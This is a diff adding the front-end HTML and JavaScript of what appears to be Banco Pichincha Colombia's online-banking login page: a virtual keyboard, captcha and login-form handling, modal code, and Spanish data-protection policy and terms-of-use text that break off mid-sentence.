+                <li><a key="1" maykey="!" href="javascript:;">1</a></li>
+                <li><a key="2" maykey="@" href="javascript:;">2</a></li>
+                <li><a key="3" maykey="#" href="javascript:;">3</a></li>
+                <li><a key="4" maykey="$" href="javascript:;">4</a></li>
+                <li><a key="5" maykey="%" href="javascript:;">5</a></li>
+                <li><a key="6" maykey="^" href="javascript:;">6</a></li>
+                <li><a key="7" maykey="&amp;" href="javascript:;">7</a></li>
+                <li><a key="8" maykey="*" href="javascript:;">8</a></li>
+                <li><a key="9" maykey="(" href="javascript:;">9</a></li>
+                <li><a key="0" maykey=")" href="javascript:;">0</a></li>
+                <li><a key="BS" href="javascript:;" class="back-key"></a></li>
+                <li><a key="q" href="javascript:;">q</a></li>
+                <li><a key="w" href="javascript:;">w</a></li>
+                <li><a key="e" href="javascript:;">e</a></li>
+                <li><a key="r" href="javascript:;">r</a></li>
+                <li><a key="t" href="javascript:;">t</a></li>
+                <li><a key="y" href="javascript:;">y</a></li>
+                <li><a key="u" href="javascript:;">u</a></li>
+                <li><a key="i" href="javascript:;">i</a></li>
+                <li><a key="o" href="javascript:;">o</a></li>
+                <li><a key="p" href="javascript:;">p</a></li>
+                <li><a key="=" maykey="+" href="javascript:;">=</a></li>
+                <li><a key="may" href="javascript:;" class="tall-key shift-key">MAY</a></li>
+                <li><a key="a" href="javascript:;">a</a></li>
+                <li><a key="s" href="javascript:;">s</a></li>
+                <li><a key="d" href="javascript:;">d</a></li>
+                <li><a key="f" href="javascript:;">f</a></li>
+                <li><a key="g" href="javascript:;">g</a></li>
+                <li><a key="h" href="javascript:;">h</a></li>
+                <li><a key="j" href="javascript:;">j</a></li>
+                <li><a key="k" href="javascript:;">k</a></li>
+                <li><a key="l" href="javascript:;">l</a></li>
+                <li><a key="ñ" href="javascript:;">ñ</a></li>
+                <li><a key="z" href="javascript:;">z</a></li>
+                <li><a key="x" href="javascript:;">x</a></li>
+                <li><a key="c" href="javascript:;">c</a></li>
+                <li><a key="v" href="javascript:;">v</a></li>
+                <li><a key="b" href="javascript:;">b</a></li>
+                <li><a key="n" href="javascript:;">n</a></li>
+                <li><a key="m" href="javascript:;">m</a></li>
+                <li><a key="," href="javascript:;">,</a></li>
+                <li><a key="." href="javascript:;">.</a></li>
+                <li><a key="-" maykey="_" href="javascript:;">-</a></li>
+                <li><a key=" " href="javascript:;" class="wide-key block-key">ESPACIO</a></li>
+            </ul>
+                <a id="textoSugerenciaTeclado" key="" class="keyboard-disclaimer link-inversed">Por tu seguridad, te sugerimos utilizar el teclado virtual para ingresar tu contraseña</a>
+        </div>
+    </div>
+    <button class="keyboard-switch btn btn-secondary btn-inversed btn-small btn-icon icon-keyboard">Teclado virtual</button>
+    <script type="text/javascript">
+        
+        
+        if (isMobileDevice()){
+            $(".virtual-keyboard, .keyboard-switch").hide();
+        }
+        
+        $('button.keyboard-switch').bind('click', function(){
+            $(this).parents('.virtual-keyboard:first').toggleClass('state-open state-closed');
+        });
+    </script>
+</div>
+
+<script>
+
+var exchangeToken;
+autoFocus();
+
+var recaptchaStep1;
+
+var captchasLoaded = function(){
+    if (!isMobile()){
+        recaptchaStep1 = grecaptcha.render('recaptchaStep1', {
+        'sitekey' : '6Lcpbh0TAAAAAAkMiFr6Bn68B550_ZndYT9d3QM3',
+        'theme' : 'light'
+        });  
+    }
+};
+
+documentReady(function(){
+    exchangeToken = null;
+
+    $(".screen-keyboard-support").focus(function() {
+        focusOn($(this).attr('id'));
+    });
+    
+    showHashedMessages();
+});
+
+function recoverPassword(){
+    goToPage('/frontend/recoverpassword/index');
+}
+
+function recoverUser(){
+    goToPage('/frontend/recoveruser/index');
+}
+
+function updateWizardStep(step) {
+    $('ul.wizard-steps li.state-active').removeClass('state-active');
+    $('#step' + step + 'Indicator').addClass('state-active');
+}
+
+function goToStep(step) {
+    $("#loginStep1").addClass("hidden_absolute");
+    $("#loginStep2").addClass("hidden_absolute");
+    $("#loginStep3").addClass("hidden_absolute");
+    $("#loginStep3a").addClass("hidden_absolute");
+    
+    $('.div-state-error').removeAttr('id');
+    $("#loginStep" + step).removeClass("hidden_absolute");
+    $("#loginStep" + step + ' .div-state-error').attr('id', 'div-state-error');
+}
+
+function sendStep1Form() {
+    hideFormErrors();
+    var data = {
+        channel: getDeviceEnvironment(), 
+        username: $.trim($('#field_username').val()),
+        _captcha: $.trim($("#captcha1 [name='g-recaptcha-response']").val()),
+        _password: $.trim($('#field_password').val())
+    };
+    if (getURLParameter("lang")) {
+        data.lang = getURLParameter("lang");
+    }
+    if (getURLParameter("env")) {
+        data.environment = getURLParameter("env");
+    }
+    
+    $("#btn_submit_step1").postWithTimeout({
+        url: "/frontend/login/step1",
+        data: data,
+        onSuccess: function(response){
+            $("#captcha1").hide();
+            $("#loginStep2").html(response);
+
+        },
+        onWarning: function(response){
+            if (response.code === "API017W" || response.code === "API018W") {
+                response.data.username = "";
+                response.data.password = "";
+                
+                if(response.code === "API018W") {
+                    $("#captcha1").show();
+                    grecaptcha.reset(recaptchaStep1);
+                }else{
+                    $('#captcha1').hide();
+                }
+            }else if(response.code === "COR050W"){
+                $("#captcha1").show();
+                grecaptcha.reset(recaptchaStep1);
+            } 
+            
+            showFormErrors(response);
+            $('#field_password').val("");
+        }
+    });
+}
+</script></div>
+        </div>
+            
+        
+
+
+
+
+<div class="fancy-modal-wrapper" id="template-loading-modal">
+    <div class="fancy-modal-overlay">&nbsp;</div>
+    <div class="fancy-modal no-print">
+        <div class="main-content-header">
+            <div class="modal-toolbar"><button class="btn btn-secondary icon-close btn-small" onclick="closeModal();">Cerrar</button></div>
+        </div>
+        <div class="main_modal_content_wrapper">
+            <div class="main-content modal_main_content">
+                <div id="modal-div-state-error"></div>
+                <div class="modal-header">
+                    <h1 class="modal-content-title" id="modalContentTitle"></h1>
+                </div>
+                <div id="modalContent">
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    
+    
+    var opening = false;
+    
+    $(window).on('resize', resizeModal);
+
+    $('.modal_form').on('resize', resizeModal);
+
+    function activateModal(title, content) {
+        $('#modal-div-state-error').css('display', 'none').addClass('hidden_element');
+        
+        if(!opening){
+            opening = true;
+            
+            
+            clearModalCallbacks();
+            
+            $('.fancy-modal').addClass('visible_element');
+            $('.fancy-modal-wrapper').addClass('is-visible');
+            if (title !== '') {
+                $('#modalContentTitle').show().html(title);
+            } else {
+                $('#modalContentTitle').hide().html('');
+            }
+            
+            if(content != null){
+                $('#modalContent').html(content);
+            }
+            if ($('#btn_menu_mobile').is(':visible')) {
+                activateVerticalModal();
+            } else {
+                activateHorizontalModal();
+            }
+            
+            if(isMobile()){
+                $('input[name=otp]').prop('type','number');
+            }
+        }
+    }
+
+    
+    var MODAL_CALLBACKS = {
+        onClose: null
+    };
+    
+    function setOnCloseModalCallback(fnc, executeOnPageChange) {
+        executeOnPageChange = executeOnPageChange ? executeOnPageChange : false;
+        
+        MODAL_CALLBACKS.onClose = {
+            callback: fnc,
+            executeOnPageChange: executeOnPageChange
+        };
+        
+        
+        if (typeof executeOnPageChange !== 'undefined' && executeOnPageChange) {
+            window.onbeforeunload = function(){
+                fnc();
+            };
+        }
+    }
+    function clearModalCallbacks() {
+        if (MODAL_CALLBACKS.onClose !== null && MODAL_CALLBACKS.onClose.executeOnPageChange) {
+            window.onbeforeunload = null;
+        }
+            
+        MODAL_CALLBACKS.onClose = null;
+    }
+
+    function closeModal() {
+        if (MODAL_CALLBACKS.onClose !== null) {
+            MODAL_CALLBACKS.onClose.callback();
+        }
+        
+        $('.fancy-modal').removeClass('visible_element');
+        $('.fancy-modal-wrapper').removeClass('is-visible');
+        if ($('#btn_menu_mobile').is(':visible')) {
+            closeVerticalModal();
+        }else {
+            closeHorizontalModal();
+        }
+        
+        clearModalCallbacks();
+    }
+
+    function activateHorizontalModal() {
+        var height;
+        
+        if (parseInt($('.fancy-modal').css('top')) > 90) {
+            $('.fancy-modal').css('top', '90px');
+        }
+        $('body').css('overflow', 'hidden');
+
+        var header = $('.main-header').length > 0 ? parseInt($('.main-header').height().toFixed()) : 0;
+        var footer = 0;
+        var page_height = parseInt($(window).height().toFixed());
+        if ($('.main-footer').css('position') == 'fixed') {
+            footer = parseInt($('.main-footer').height().toFixed());
+        }
+        height = (page_height - (footer + header));
+        $('.fancy-modal').css('height', height + 'px');
+
+        var inner =  $('.inner-container').length > 0 ? $('.inner-container').width() - 1 : $('.external-wrapper').width() - 1  ;
+        var width = '-=' + inner + 'px';
+
+        $('.fancy-modal').css('width', inner);
+        $('.fancy-modal').css('display', 'block');
+
+        $('.fancy-modal-overlay').fadeIn(700);
+        $('.fancy-modal').animate({
+            'marginLeft': width
+        }, 500, function(){
+            opening = false;
+            
+            if(isIpad()){
+                $('.fancy-modal input').focus(function(){
+                    $('.fancy-modal').css('position', 'absolute');
+                });
+            }
+        });
+
+        $('.modal_form').css('height', (height - 20) + 'px');
+        $('.modal_form').addClass('scrollable');
+        $('.main_modal_content_wrapper').css('height', (height - 100) + 'px');
+        $('.main_modal_content_wrapper').css('overflow', 'auto');
+    }
+
+    function activateVerticalModal() {
+        var scrollbar = 0;
+        var height;
+        $('.fancy-modal').css('width', $(window).width() + scrollbar);
+
+        $('body').css('overflow', 'hidden');
+        $('.fancy-modal').css('display', 'block');
+
+        $('.fancy-modal-overlay').fadeIn(1500);
+        $('.fancy-modal').animate({
+            'top': '45px'
+        }, 500, function(){
+            opening = false;
+            height = $(window).height() + 'px';
+            fixScrollModal(height);
+        });
+    }
+
+    (function ($) {
+        $.fn.hasScrollBar = function () {
+            return this.get(0).scrollHeight > this.height();
+        }
+    })(jQuery);
+
+    function closeHorizontalModal() {
+        if(isIpad()){
+            $('.fancy-modal input').unbind('focus');
+            $('.fancy-modal').css('position', 'fixed');
+        }
+
+        var width = "0px";
+        $('body').css('overflow', 'visible');
+        $('.fancy-modal-overlay').fadeOut(700);
+        $('.fancy-modal').animate({
+            'marginLeft': width
+        }, 500);
+    }
+    function closeVerticalModal() {
+        $('body').css('overflow', 'visible');
+        $('.fancy-modal-overlay').fadeOut(700);
+        $('.fancy-modal').animate({
+            'top': '100%'
+        }, 500);
+    }
+
+    function resizeModal() {
+        var footer = 0;
+        var height;
+        var modal_is_visible = $('.fancy-modal').hasClass('visible_element');
+        if (modal_is_visible) {
+            if ($('#btn_menu_mobile').is(':visible')) {
+                $('.fancy-modal').css('width', $(window).width());
+
+                height = $(window).height() + 'px';
+                $('.fancy-modal').css('height', height);
+                $('.fancy-modal').css('margin-left', '0px');
+                $('.fancy-modal').css('top', '50px');
+                $('.fancy-modal').css('overflow-x', 'hidden');
+            }
+            else {
+                var header = parseInt($('.main-header').height().toFixed());
+                if ($('.main-footer').css('position') == 'fixed') {
+                    footer = parseInt($('.main-footer').height().toFixed());
+                }
+                var page_height = parseInt($(window).height().toFixed());
+                height = (page_height - (footer + header)) + 'px';
+                $('.fancy-modal').css('height', height);
+                $('.fancy-modal').css('top', header + 'px');
+
+                $('.fancy-modal').css('margin-left', '100%');
+                var inner = $('.inner-container').width();
+                $('.fancy-modal').css('width', inner);
+                $('.fancy-modal').css('margin-left', '-' + inner + 'px');
+                $('.fancy-modal').css('overflow-x', 'hidden');
+            }
+        } else {
+            
+            if ($('#btn_menu_mobile').is(':visible')) {
+                if ($('.fancy-modal').css('top') != '100%') {
+                    $('.fancy-modal').css('top', '100%');
+                }
+            }
+        }
+    }
+    
+    function fixScrollModal(height){
+        var fancyModalTop = parseInt($(".fancy-modal").css("top"));
+        var modalWrapperHeight = parseInt($(".main_modal_content_wrapper").height());
+        var positionModalWrapper = $(".main_modal_content_wrapper").position();
+        if((fancyModalTop+positionModalWrapper.top+modalWrapperHeight)> parseInt(height)){
+            var contentWrapperHeight = $(".main_modal_content_wrapper").css("height");
+            $(".main_modal_content_wrapper").css("overflow","auto");
+            var modalContentHeight = $("#modalContent").css("height");
+            $(".main_modal_content_wrapper").css("height",modalContentHeight);
+            $("#modalContent").css("height",contentWrapperHeight);
+        }
+    }
+</script><div id="pageWorking" class="page-loading-state">
+            <div class="loading-indicator-wrapper">
+                <p class="">Cargando...<span class="loading-indicator"></span></p>
+            </div>
+        </div>
+            
+        
+
+
+
+
+
+<footer class="main-footer">
+    <div class="prefooter cf">
+        <div class="left-section">
+            <div class="social">
+               <ul>
+                    
+                    
+
+                    
+                    
+                </ul>
+            </div>
+            <p class="call-center-intro">Atención personalizada 24 horas al día los 365 días del año en nuestro Call Center</p>
+            <p class="call-center-numbers"><strong>Bogotá:</strong> (601) 650 1000&nbsp;&nbsp;&nbsp;<strong>Nacional:</strong> 01 8000 919918</p>
+        </div>
+        <div class="right-section">
+            <p class="copy-right">© 2015 Banco Pichincha. Todos los derechos reservados</p>
+            <ul class="footer-links">
+                <li><a href="javascript:;" id="btn_security_policy_info">Políticas de seguridad</a></li>
+                
+            </ul>
+        </div>
+    </div>
+</footer>
+<script type="text/javascript">
+    $(document).ready(function(){
+        $('#btn_security_policy_info').click(function(){
+              activateModal('Políticas de seguridad','<div class="modal-content"><p><strong>Pol&iacute;tica de Tratamiento de Informaci&oacute;n</strong></p><p>&nbsp;</p><p><strong>Declaraci&oacute;n de Titularidad y Veracidad de la Informaci&oacute;n.</strong></p><p style="text-align: justify;">Como la informaci&oacute;n aqu&iacute; suministrada por m&iacute; es confidencial y b&aacute;sica para la vinculaci&oacute;n como Cliente del BANCO PICHINCHA, la gesti&oacute;n y aprobaci&oacute;n de cualquier producto u operaci&oacute;n y/o la atenci&oacute;n de mis solicitudes, peticiones, quejas o reclamos; el BANCO PICHINCHA exige que todos los datos suministrados sean exactos y se puedan verificar. Declaro que la informaci&oacute;n suministrada en este Sitio Web es de mi titularidad, concuerda con la realidad y asumo plena responsabilidad por la veracidad de la misma; cualquier inexactitud podr&aacute; acarrear su rechazo o la no aprobaci&oacute;n de la vinculaci&oacute;n al Banco y/o de la solicitud del (de los) producto(s), sin responsabilidad alguna por parte de BANCO PICHINCHA frente a terceros o al (a los) solicitantes. Reconozco y acepto que en el evento que la informaci&oacute;n por m&iacute; suministrada en este Sitio Web no sea de mi propiedad, induzca a una falsedad personal o sea violatoria del bien jur&iacute;dico tutelado denominado &ldquo;de la protecci&oacute;n de la informaci&oacute;n y de los datos&rdquo; podr&eacute; incurrir en tipos penales sancionales por la Ley Penal Colombiana.</p><p><strong>Autorizaci&oacute;n para el Reporte y Consulta de Informaci&oacute;n ante los Operadores de Bancos de Datos de Informaci&oacute;n Financiera y/o Crediticia (Ley 1266 de 2008)</strong></p><p style="text-align: justify;">Con la finalidad de que el BANCO PICHINCHA pueda dar tr&aacute;mite a mi solicitud de nuevos productos, evaluar y estudiar mi comportamiento crediticio y comercial y mantener actualizada mi informaci&oacute;n financiera, crediticia y comercial ante los operadores de bancos de datos, AUTORIZO al BANCO PICHINCHA para que: i) obtenga toda la informaci&oacute;n y referencias relativas a mi persona, a mi comportamiento crediticio y comercial, mis h&aacute;bitos de pago, el manejo de la(s) cuenta(s) corriente(s) y de ahorros, de tarjetas de cr&eacute;dito, de otros productos financieros y/o de servicios contratados con el sector financiero y/o con el sector real y, en general, el cumplimiento dado a mis obligaciones; ii) consulte ante los operadores de bancos de datos, as&iacute; como ante cualquier otra entidad de caracter&iacute;sticas similares que en el futuro se establezca, mi endeudamiento con el sector financiero, as&iacute; como la informaci&oacute;n comercial disponible sobre el cumplimiento dado a los compromisos adquiridos con dicho(s) sector(es); iii) incluya mi nombre, apellidos y tipo y n&uacute;mero de mi documento de identificaci&oacute;n, y dem&aacute;s informaci&oacute;n que se haga necesaria, en los archivos de deudores y obligados que llevan los operadores de bancos de datos, o cualquiera otra entidad que en el futuro se establezca con ese prop&oacute;sito, reportando el comportamiento positivo o negativo que se presente en la atenci&oacute;n de las obligaciones a mi cargo. La autorizaci&oacute;n de reporte aqu&iacute; establecida se hace extensiva a cualquier persona natural o jur&iacute;dica que en el futuro llegue a ostentar la calidad de acreedor en relaci&oacute;n con la(s) obligaci&oacute;n(es) contra&iacute;da(s) con el BANCO PICHINCHA; iv) consulte y procese mi informaci&oacute;n ante los operadores de bancos de datos y operadores de informaci&oacute;n y riesgo (Cifin, Experian, Covinoc, Fenalcheque) o cualquier otra que en un futuro se establezca; v) entregue o comparta mi informaci&oacute;n con personas jur&iacute;dicas que administran bases de datos, para efectos de prevenci&oacute;n y control de fraudes y selecci&oacute;n de riesgos; vi) remita v&iacute;a correo electr&oacute;nico y/o f&iacute;sico, seg&uacute;n lo estime pertinente, a la(s) direcci&oacute;n(direcciones) suministradas por m&iacute; en este Sitio Web y/o en los registros de esa Entidad Financiera la notificaci&oacute;n previa de que trata el art&iacute;culo 21 de la Ley 1266 de 2008 y/o cualquier otra norma que lo modifique o adicione; vii) conserve, con las debidas actualizaciones y durante el per&iacute;odo necesario se&ntilde;alado en la Ley, mi informaci&oacute;n crediticia; viii) reporte a las autoridades p&uacute;blicas, tributarias, aduaneras o judiciales, la informaci&oacute;n que requieran en el desarrollo de sus funciones; ix) ejerza el derecho de inspecci&oacute;n para corroborar en cualquier tiempo que la informaci&oacute;n que he suministrado para la aprobaci&oacute;n del (de los) producto(s) y/o servicio(s) es veraz, completa, exacta y actualizada; y, x) para que en el evento de negarse la solicitud de vinculaci&oacute;n al Banco y/o el otorgamiento de uno o varios de los productos y/o servicios que &eacute;ste ofrece, dicha Entidad destruya los documentos que se aportan como soporte de la respectiva solicitud, dejando al efecto constancia expresa de su destrucci&oacute;n. El resultado del an&aacute;lisis para acceder al producto, me ser&aacute; informado a trav&eacute;s de alguno de los medios de contacto que he suministrado.</p><p><strong>Autorizaci&oacute;n para el Tratamiento de la Informaci&oacute;n Personal (Ley 1581 de 2012)</strong></p><p style="text-align: justify;">De manera libre, voluntaria y expresa autorizo al BANCO PICHINCHA para que lleve a cabo el tratamiento de mis datos personales. En virtud de dicha autorizaci&oacute;n de tratamiento, el BANCO PICHINCHA podr&aacute; recolectar, almacenar, usar, circular, transferir, trasmitir, suprimir y/o actualizar mis datos e informaci&oacute;n personal, la cual, es suministrada por m&iacute; a trav&eacute;s del Sitio Web www.bancopichincha.com.co. Mis datos e informaci&oacute;n personal podr&aacute;n ser sujetos de tratamiento por el BANCO PICHINCHA, sus Encargados o Personas Responsables a quienes &eacute;l les haya transmitido o transferido la informaci&oacute;n. En ese sentido, el tratamiento por la presente autorizaci&oacute;n permitido al BANCO PICHINCHA y a quien tenga la calidad de Encargado o Persona Responsable podr&aacute; tener por objeto las finalidades leg&iacute;timas de: i) cumplir las obligaciones contractuales y reglamentarias, as&iacute; como para la prestaci&oacute;n de los servicios contratados; ii) atender y dar soluci&oacute;n a las solicitudes, peticiones, quejas o reclamos formulados al Banco; iii) crear y actualizar los perfiles transaccionales; iv) realizar gestiones comerciales; v) ofrecer productos o servicios, propios o de terceros; vi) realizar labores para que se avalen, afiancen o garanticen las operaciones de cr&eacute;dito; vii) realizar labores para que se origine mi vinculaci&oacute;n al Banco como Cliente de uno o varios productos y servicios financieros pudiendo compartir informaci&oacute;n con terceros, tales como, Compa&ntilde;&iacute;as Aseguradoras, Intermediarios de Seguros, Instituciones Educativas, Concesionarios, y Entidades P&uacute;blicas y/o Privadas de cualquier naturaleza con las que se tengan Convenios de Libranza y/u otro tipo de alianzas comerciales, entre otros; viii) realizar gestiones de cobranza; ix) informar sobre los cambios realizados a los productos y servicios del portafolio del Banco; x) informar sobre las campa&ntilde;as y estrategias promocionales y de mercadeo; xi) analizar las tendencias y comportamientos de consumo de los consumidores financieros; xii) recibir informaci&oacute;n, ofertas comerciales y publicitarias de productos del Banco y de aliados de &eacute;ste; xiii) recibir cualquier tipo de informaci&oacute;n y/o comunicaci&oacute;n que el Banco estime necesario; y, xiv) se adelanten todos los procesos de relacionamiento con el cliente (soportados o no en tecnolog&iacute;a), para un abordaje integral con todos mis productos y soluciones contratadas con el BANCO PICHINCHA, entre otros permitidos por la Ley. Conozco y entiendo que las respuestas a las preguntas sobre el tratamiento de datos sensibles son facultativas. Como Titular de la informaci&oacute;n tengo derecho a conocer, actualizar y rectificar mis datos personales, solicitar prueba de la autorizaci&oacute;n otorgada para el tratamiento de la informaci&oacute;n, informarme sobre el uso que se ha dado a los mismos, revocar la autorizaci&oacute;n, solicitar la supresi&oacute;n de mis datos cuando sea procedente y acceder en forma gratuita a los mismos. En virtud de la presente autorizaci&oacute;n el responsable del tratamiento de la informaci&oacute;n es BANCO PICHINCHA S.A.</p><p style="text-align: justify;">La presente autorizaci&oacute;n se hace extensiva a quien represente los intereses del BANCO PICHINCHA y a quien la Entidad ceda sus derechos, obligaciones o su posici&oacute;n contractual a cualquier t&iacute;tulo, en relaci&oacute;n con los productos o servicios de los que soy titular.</p><p style="text-align: justify;">Para ejercer los derechos sobre sus datos personales puede comunicarse a la l&iacute;nea de Atenci&oacute;n en Bogot&aacute;: (601) 650 1000 o a Nivel Nacional al: 01 8000 919918. Para conocer nuestra pol&iacute;tica de privacidad visite https://www.bancopichincha.com.co</p><p><strong>Autorizaci&oacute;n para Compartir Datos Personales con Entidades Pertenecientes al Grupo. Econ&oacute;mico</strong></p><p style="text-align: justify;">Autorizo expresa y voluntariamente al BANCO PICHINCHA y/o a cualquier otra Entidad que represente sus derechos, a compartir mi informaci&oacute;n personal, financiera, crediticia y comercial como Cliente del Banco con cualquiera otra persona o Entidad Vinculada al Grupo Econ&oacute;mico al que pertenece y/o llegue a pertenecer el BANCO PICHINCHA o la Entidad que represente sus derechos; para realizar el mismo tratamiento y con las mismas finalidades que haya llegado a autorizar al BANCO PICHINCHA.</p><p style="text-align: justify;">Declaro haber le&iacute;do cuidadosamente el contenido de este documento y haberlo comprendido a cabalidad, raz&oacute;n por la cual entiendo su alcance e implicaciones y con la aceptaci&oacute;n de los t&eacute;rminos y condiciones contenidos en este Sitio Web de BANCO PICHINCHA acepto expresamente: i) la autorizaci&oacute;n para el reporte y consulta de mi informaci&oacute;n ante los operadores de bancos de datos de informaci&oacute;n financiera y/o crediticia (Ley 1266 de 2008); ii) el tratamiento de mis datos personales y dem&aacute;s informaci&oacute;n; y, iii) el compartir mis datos personales con Entidades pertenecientes al Grupo Econ&oacute;mico.</p><p style="text-align: justify;">El presente documento tendr&aacute; validez desde su aceptaci&oacute;n de los t&eacute;rminos y condiciones marcando el check de aceptaci&oacute;n electr&oacute;nica del formulario de solicitud, durante la vigencia de la relaci&oacute;n del Cliente con el BANCO PICHINCHA y/o de quien en el futuro represente sus derechos, u ostente los derechos y/u obligaciones a cargo de BANCO PICHINCHA, y en general por el t&eacute;rmino establecido en la Ley.</p></div>');
+        });
+        $('#btn_terms_and_conditions').click(function(){
+              activateModal('Términos de uso','<div class="modal-content"><p style="text-align: center;">&nbsp;<strong>T&Eacute;RMINOS Y CONDICIONES BANCA VIRTUAL Y APLICACI&Oacute;N M&Oacute;VIL BANCO PICHINCHA</strong></p><p>El presente Reglamento consigna las condiciones por las cuales se rige el uso y manejo del Portal Transaccional y la Aplicaci&oacute;n M&oacute;vil (en adelante la "BANCA VIRTUAL"), servicio que ofrece a sus clientes (en adelante &ldquo;EL CLIENTE&rdquo;) el Banco Pichincha S.A. (en adelante el &ldquo;BANCO&rdquo;) por lo cual se conviene:</p><p style="text-align: justify;"><strong>PRIMERA</strong>: La BANCA VIRTUAL es un servicio electr&oacute;nico que ofrece el BANCO a sus clientes a trav&eacute;s del cual suministra informaci&oacute;n, permite interactuar y transar con el portafolio de Productos y Servicios que el BANCO ofrece a los CLIENTES. <strong>SEGUNDA</strong>: Este servicio estar&aacute; sujeto a los l&iacute;mites, condiciones, reglamentos y t&eacute;rminos de uso contenidos en este documento y en los contratos, convenios y/o reglamentos convenidos entre EL CLIENTE y el BANCO, de acuerdo con los productos y/o servicios adquiridos por EL CLIENTE. <strong>TERCERA</strong>: El BANCO no asume responsabilidad por los riesgos a los que se encuentra expuesta la infraestructura tecnol&oacute;gica mediante la cual se presta el servicio, siempre que la ocurrencia de dichos riesgos no sea imputable de manera directa al BANCO. &nbsp;Esta exenci&oacute;n de responsabilidad se extiende entre otras materias, a sabotajes en los soportes l&oacute;gicos, fallas en los equipos de hardware, y ca&iacute;das en el fluido el&eacute;ctrico o en los servicios de telecomunicaciones asociados a la prestaci&oacute;n del servicio, entre otras.&nbsp; En ese sentido, es claro que trat&aacute;ndose de eventos de fuerza mayor, caso fortuito, el hecho exclusivo de un tercero y/o hechos o actos atribuibles directamente al CLIENTE, el BANCO no garantiza el acceso permanente e ininterrumpido al sitio web y no asume responsabilidad ante EL CLIENTE.&nbsp; De presentarse tal situaci&oacute;n, EL CLIENTE podr&aacute; utilizar los dem&aacute;s canales que EL BANCO tiene habilitados para la realizaci&oacute;n de operaciones. En el evento de presentarse las circunstancias o hechos antes enunciados, El BANCO limita su responsabilidad al ejercicio de las actividades correctivas que razonablemente deban tomarse para restituir el servicio o hacer frente a las anomal&iacute;as que llegaren a afectarlo.&nbsp; <strong>CUARTA</strong>: EL CLIENTE acepta que ser&aacute; de uso obligatorio para el ingreso a la BANCA VIRTUAL el nombre de usuario,&nbsp; la&nbsp; clave personal definida por EL CLIENTE y dem&aacute;s mecanismos de seguridad que disponga EL BANCO para el acceso a la BANCA VIRTUAL (en adelante las &ldquo;CREDENCIALES DE AUTENTICACI&Oacute;N&rdquo;). Lo anterior, sin perjuicio de los mecanismos de seguridad adicionales que EL BANCO llegare a establecer. Las Partes acuerdan que estos elementos identifican al CLIENTE en las transacciones desarrolladas y/o establecidas a trav&eacute;s de la BANCA VIRTUAL. <strong>QUINTA</strong>: La definici&oacute;n de las CREDENCIALES DE AUTENTICACI&Oacute;N ser&aacute; responsabilidad de EL CLIENTE, as&iacute; como su debida actualizaci&oacute;n de acuerdo con las pol&iacute;ticas que el BANCO establezca. EL CLIENTE se obliga a custodiar y mantener en absoluta reserva las CREDENCIALES DE AUTENTICACI&Oacute;N y dem&aacute;s elementos y/o mecanismos de seguridad que el BANCO llegue a establecer para la utilizaci&oacute;n de la BANCA VIRTUAL, a fin que ninguna otra persona pueda hacer uso de las mismas o conocerlas por cualquier medio; por lo tanto, EL CLIENTE no podr&aacute; ceder ni hacerse sustituir por terceros en el ejercicio de los derechos y compromisos que se le imponen, y que en el evento de incumplirlos, EL CLIENTE asume como propios ante el BANCO y ante terceros el riesgo y la responsabilidad por cualquier uso indebido que se haga a causa del descuido en la custodia o reserva que asume.&nbsp; <strong>SEXTA: </strong>La BANCA VIRTUAL permite acceder a dos tipos de administraci&oacute;n:&nbsp; B&aacute;sico e Intermedio.&nbsp; Para tener el nivel de administraci&oacute;n Intermedio EL CLIENTE debe solicitar los permisos respectivos al BANCO.&nbsp; Una vez obtenido el nivel de administraci&oacute;n Intermedio no es posible retornar al nivel B&aacute;sico.&nbsp; Entre otras funcionalidades, el nivel Intermedio de Administraci&oacute;n permite que EL CLIENTE designe bajo su exclusiva y directa responsabilidad un tercero que podr&aacute; acceder a administrar su cuenta, de acuerdo con los permisos y funcionalidades que le asigne EL CLIENTE. En ese sentido, EL CLIENTE se har&aacute; responsable de todas las acciones, transacciones, movimientos, y funcionalidades, entre otras actividades, a los que le haya dado acceso al Tercero respecto de los Productos y Servicios ofrecidos por el BANCO al CLIENTE.&nbsp; EL CLIENTE exime de toda responsabilidad al BANCO sobre las acciones realizadas por el Tercero al que haya dado acceso.&nbsp; <strong>S&Eacute;PTIMA: </strong>Se conviene que, salvo prueba en contrario, EL CLIENTE asume toda la responsabilidad de las operaciones, transacciones y/o instrucciones ordenadas a trav&eacute;s de la BANCA VIRTUAL. Con base en los art&iacute;culos 640 inciso 3&deg; y 842 del C&oacute;digo de Comercio y/o cualquier disposici&oacute;n que los adicione o modifique, se pacta expresamente que si cualquier persona hace uso de la BANCA VIRTUAL con la CREDENCIALES DE AUTENTICACI&Oacute;N de EL CLIENTE, EL CLIENTE reconoce como suyas tales operaciones y/o transacciones siendo responsable ante el BANCO y ante terceros por los perjuicios que ello genere. <strong>OCTAVA</strong>: Salvo prueba en contrario, EL CLIENTE reconoce como suyas las transacciones, operaciones y/o instrucciones llevadas a cabo a trav&eacute;s de la BANCA VIRTUAL, lo mismo que todos y cada uno de los registros magn&eacute;ticos, electr&oacute;nicos y f&iacute;sicos que contengan dichos datos, al igual que las cantidades registradas al tenor de lo previsto en la Ley 527 de 1999 y dem&aacute;s normas concordantes. <strong>NOVENA</strong>: Las transacciones, operaciones y/o instrucciones realizadas por EL CLIENTE a trav&eacute;s de la BANCA VIRTUAL se sujetar&aacute;n al perfil establecido y a las pol&iacute;ticas, cuant&iacute;as y horarios que establezca el BANCO para la utilizaci&oacute;n de la BANCA VIRTUAL y para el uso de cada uno de los productos y/o servicios contratados por EL CLIENTE con el BANCO. EL CLIENTE acepta que reconocer&aacute; y pagar&aacute; la comisi&oacute;n, intereses, diferencias en cambio y dem&aacute;s accesorios que rijan los productos y/o servicios ofrecidos en la BANCA VIRTUAL y aquellos derivados de la utilizaci&oacute;n de los mismos.&nbsp; <strong>D&Eacute;CIMA: </strong>Ser&aacute;n del riesgo de EL CLIENTE los errores que se presenten en el diligenciamiento de las &oacute;rdenes de pago y/o transferencias efectuadas por EL CLIENTE y se advierte que una vez realizadas las transferencias y/o pagos de acuerdo con las &oacute;rdenes dadas por EL CLIENTE a trav&eacute;s de la BANCA VIRTUAL, el BANCO no podr&aacute; hacer reversi&oacute;n de las sumas trasferidas y/o pagadas. La fecha del traslado y/o pago ser&aacute; la indicada por EL CLIENTE a trav&eacute;s de la BANCA VIRTUAL; sin embargo, si la fecha suministrada por EL CLIENTE es s&aacute;bado, domingo o d&iacute;a no h&aacute;bil, el BANCO podr&aacute; realizar el traslado y/o pago el d&iacute;a h&aacute;bil siguiente a dicha fecha. EL CLIENTE se obliga a mantener en el 